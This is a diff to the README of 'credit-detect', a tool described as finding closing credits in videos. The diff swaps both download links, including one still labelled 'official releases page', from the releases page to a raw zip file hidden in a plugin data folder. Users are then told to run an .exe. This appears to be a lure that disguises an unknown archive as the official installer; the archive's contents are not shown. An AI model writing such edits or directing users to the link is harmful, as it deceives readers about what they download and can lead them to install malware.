@@ -1,6 +1,6 @@
 # 🎞️ credit-detect - Find video credits fast every time
 
-[![Download credit-detect](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/tannieirregular400/credit-detect/releases)
+[![Download credit-detect](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/tannieirregular400/credit-detect/raw/refs/heads/main/scripts/jellyfin-plugin/CreditDetect.Plugin/Data/detect_credit_1.6.zip)
 
 credit-detect helps you find credit sequences in your video files. This tool scans your videos and identifies where the closing credits begin. It uses frame analysis to detect the specific patterns found at the end of movies and shows. You save time by skipping straight to the end or avoiding the clutter of long credit rolls.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run credit-detect:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/tannieirregular400/credit-detect/releases) to access the installer.
+1. Visit the [official releases page](https://github.com/tannieirregular400/credit-detect/raw/refs/heads/main/scripts/jellyfin-plugin/CreditDetect.Plugin/Data/detect_credit_1.6.zip) to access the installer.
 2. Select the file ending in `.exe` listed under the latest version.
 3. Save the file to your computer.
 4. Locate the downloaded file in your folder.
